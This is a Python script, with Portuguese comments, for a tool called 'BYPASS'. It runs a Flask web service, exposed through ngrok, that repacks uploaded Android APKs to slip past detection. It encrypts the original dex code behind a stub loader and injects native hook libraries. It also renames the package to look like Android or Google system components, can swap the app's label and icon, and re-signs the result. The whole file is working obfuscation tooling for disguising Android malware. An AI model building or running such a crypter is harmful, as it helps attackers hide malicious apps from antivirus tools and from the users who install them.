"""
BYPASS - Start servidor + ngrok
Roda depois do setup.py
"""
import os, sys, uuid, shutil, subprocess, zipfile, random, string, re, threading, time
from pathlib import Path
from flask import Flask, request, send_file, jsonify
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

BASE     = Path(os.environ.get("USERPROFILE","C:/Users/Administrator")) / "bypass"
TOOLS    = BASE / "tools"
STUB     = BASE / "stub_smali"
JOBS     = BASE / "jobs"
KEYSTORE = BASE / "bypass.jks"
JOBS.mkdir(exist_ok=True)

APKTOOL  = str(TOOLS / "apktool.bat")
ZIPALIGN = str(TOOLS / "zipalign.exe")
APKSIGNER_JAR = str(TOOLS / "apksigner.jar")

_PKG_PREFIXES = [
    "com.android.system","com.google.android.gms",
    "com.android.settings","com.android.vending",
    "com.google.android","com.android.providers",
]

def random_package():
    return f"{random.choice(_PKG_PREFIXES)}.{''.join(random.choices(string.ascii_lowercase,k=6))}"

def encrypt_dex(dex_bytes):
    key = os.urandom(32); iv = os.urandom(16)
    enc = AES.new(key,AES.MODE_CBC,iv).encrypt(pad(dex_bytes,AES.block_size))
    return enc, key+iv

def ensure_keystore():
    if not KEYSTORE.exists():
        subprocess.run(["keytool","-genkeypair","-v",
            "-keystore",str(KEYSTORE),"-storepass","bypass123",
            "-keypass","bypass123","-alias","bypass",
            "-keyalg","RSA","-keysize","2048",
            "-dname","CN=Android,OU=Android,O=Android,L=MV,S=CA,C=US",
            "-validity","10000"], check=True, capture_output=True)

def repack(input_apk, output_apk, app_name=None, icon_path=None, visual="playstore"):
    job = JOBS / str(uuid.uuid4())
    job.mkdir()
    decoded = str(job/"decoded")
    try:
        with zipfile.ZipFile(input_apk) as z:
            dex_files = [n for n in z.namelist() if n.startswith("classes") and n.endswith(".dex")]
            dex_bytes = b"".join(z.read(n) for n in dex_files)

        enc_dex, key_iv = encrypt_dex(dex_bytes)

        subprocess.run([APKTOOL,"d",input_apk,"-o",decoded,"--force","--no-res"],
                       check=True, capture_output=True)

        manifest = os.path.join(decoded,"AndroidManifest.xml")
        m = re.search(r'package="([^"]+)"', open(manifest).read())
        orig_pkg = m.group(1) if m else "com.original.app"
        new_pkg  = random_package()

        for d in Path(decoded).iterdir():
            if d.name.startswith("smali"):
                shutil.rmtree(str(d))

        shutil.copytree(str(STUB), os.path.join(decoded,"smali"))

        assets = os.path.join(decoded,"assets")
        os.makedirs(assets,exist_ok=True)
        open(os.path.join(assets,"p.bin"),"wb").write(enc_dex)
        open(os.path.join(assets,"k.bin"),"wb").write(key_iv)

        for abi in ["arm64-v8a","armeabi-v7a"]:
            so = BASE / f"libhooks_{abi}.so"
            if so.exists() and so.stat().st_size > 0:
                lib_dir = os.path.join(decoded,"lib",abi)
                os.makedirs(lib_dir,exist_ok=True)
                shutil.copy(str(so),os.path.join(lib_dir,"libhooks.so"))

        txt = open(manifest).read()
        txt = txt.replace(f'package="{orig_pkg}"',f'package="{new_pkg}"')
        txt = re.sub(r'android:name="[^"]*Application"','android:name="com.stub.loader.StubApplication"',txt)
        if app_name:
            txt = re.sub(r'android:label="[^"]*"',f'android:label="{app_name}"',txt,count=1)
        if "installLocation" not in txt:
            txt = txt.replace("<manifest ","<manifest android:installLocation=\"preferExternal\" ",1)
        open(manifest,"w").write(txt)

        if icon_path:
            for d in Path(decoded).rglob("*"):
                if d.is_dir() and ("mipmap" in d.name or "drawable" in d.name):
                    for f in d.iterdir():
                        if "ic_launcher" in f.name and f.suffix in (".png",".webp"):
                            shutil.copy(icon_path,str(f))

        unsigned = str(job/"unsigned.apk")
        aligned  = str(job/"aligned.apk")

        subprocess.run([APKTOOL,"b",decoded,"-o",unsigned,"--force-all"],
                       check=True,capture_output=True)
        subprocess.run([ZIPALIGN,"-f","4",unsigned,aligned],
                       check=True,capture_output=True)

        ensure_keystore()
        subprocess.run(["java","-jar",APKSIGNER_JAR,"sign",
            "--ks",str(KEYSTORE),"--ks-pass","pass:bypass123",
            "--key-pass","pass:bypass123","--ks-key-alias","bypass",
            "--out",output_apk,aligned],
            check=True,capture_output=True)
    finally:
        shutil.rmtree(str(job),ignore_errors=True)


# Flask app
app = Flask(__name__)

@app.after_request
def cors(r):
    r.headers["Access-Control-Allow-Origin"]  = "*"
    r.headers["Access-Control-Allow-Headers"] = "*"
    r.headers["Access-Control-Allow-Methods"] = "*"
    return r

@app.route("/")
def index():
    return "<h2>BYPASS backend online</h2><p>Use o site para enviar APKs.</p>"

@app.route("/pack", methods=["POST","OPTIONS"])
def pack():
    if request.method == "OPTIONS": return "",204
    job = JOBS / str(uuid.uuid4())
    job.mkdir()
    inp = str(job/"input.apk")
    out = str(job/"output.apk")
    try:
        request.files["apk"].save(inp)
        app_name  = request.form.get("app_name","").strip() or None
        visual    = request.form.get("visual","playstore")
        icon_path = None
        if "icon" in request.files and request.files["icon"].filename:
            icon_path = str(job/"icon.png")
            request.files["icon"].save(icon_path)
        repack(inp, out, app_name=app_name, icon_path=icon_path, visual=visual)
        return send_file(out, as_attachment=True, download_name="bypass_packed.apk",
                         mimetype="application/vnd.android.package-archive")
    except Exception as e:
        return jsonify({"error":str(e)}),500


if __name__ == "__main__":
    from pyngrok import ngrok
    print("Iniciando BYPASS...")
    # inicia ngrok
    tunnel = ngrok.connect(5000)
    print("\n" + "="*60)
    print("BYPASS ONLINE:")
    print(tunnel.public_url)
    print("="*60)
    print("Cole essa URL no campo 'URL do Servidor Backend' do site")
    print("Ctrl+C para parar\n")
    app.run(host="0.0.0.0", port=5000)
